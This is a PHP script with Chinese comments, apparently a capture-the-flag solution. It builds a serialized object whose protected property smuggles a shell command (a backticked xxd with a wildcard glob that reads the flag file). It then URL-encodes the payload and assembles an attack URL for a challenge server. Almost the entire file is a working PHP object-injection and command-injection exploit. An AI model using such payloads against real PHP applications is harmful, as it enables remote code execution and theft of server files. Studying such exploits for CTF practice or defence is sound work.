<?php
// 问题：目标代码中 FLAG 类的属性是 private 和 protected
// 但我们序列化的是 public 属性

// 正确的序列化应该包含属性的访问级别

class FLAG
{
    private $a;
    protected $b;

    public function __construct()
    {
        // 不做任何事
    }
}

$obj = new FLAG();

// 使用反射来设置 private/protected 属性
$reflection = new ReflectionClass('FLAG');

$propA = $reflection->getProperty('a');
$propA->setAccessible(true);
$propA->setValue($obj, "FLAG");

$propB = $reflection->getProperty('b');
$propB->setAccessible(true);
$propB->setValue($obj, ';var_dump(`xxd /?l?g`);');

$serial = serialize($obj);
echo "正确的序列化:\n";
echo $serial . "\n\n";

$encoded = urlencode($serial);
echo "URL编码:\n";
echo $encoded . "\n\n";

$url = "http://challenge.bluesharkinfo.com:29023/?exp=$encoded";
echo "完整URL:\n";
echo $url . "\n";

file_put_contents('correct_url.txt', $url);
